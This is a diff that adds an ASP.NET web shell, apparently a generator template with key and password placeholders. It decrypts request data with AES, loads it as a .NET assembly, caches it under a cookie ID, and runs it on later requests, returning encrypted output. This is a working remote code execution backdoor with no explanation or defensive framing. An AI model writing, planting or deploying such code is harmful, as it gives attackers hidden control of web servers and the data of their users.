@@ -1,0 +1,35 @@
+                try {
+                                var appcontext = HttpContext.Current;
+                                appcontext.Application.Remove("");
+                                var key = "{secretKey}";
+                                var pass = "{pass}";
+                                var cookieName = "sessionKey";
+                                var cookieValue = appcontext.Request.Cookies.Get(cookieName) == null ? "" : appcontext.Request.Cookies.Get(cookieName).Value;
+                                var md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
+                                var data = System.Convert.FromBase64String(appcontext.Request[pass]);
+                                var assembly = appcontext.Application.Get(cookieValue);
+                                if (assembly == null)
+                                {
+                                    var cookie = new HttpCookie(cookieName, System.Guid.NewGuid().ToString("N"));
+                                    cookieValue = cookie.Value;
+                                    appcontext.Response.Cookies.Add(cookie);
+                					assembly = System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length));
+                                    appcontext.Application.Set(cookieValue, assembly);
+                                }
+                                else
+                                {
+                                    var o = assembly.CreateInstance("LY");
+                                    var outStream = new System.IO.MemoryStream();
+                                    o.Equals(outStream);
+                                    o.Equals(appcontext);
+                                    o.Equals(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length));
+                                    o.ToString();
+                                    var r = outStream.ToArray();
+                                    outStream.Dispose();
+                                    appcontext.Response.Write(md5.Substring(0, 16));
+                                    appcontext.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));
+                                    appcontext.Response.Write(md5.Substring(16));
+                                }
+
+                } catch (e) {
+                }
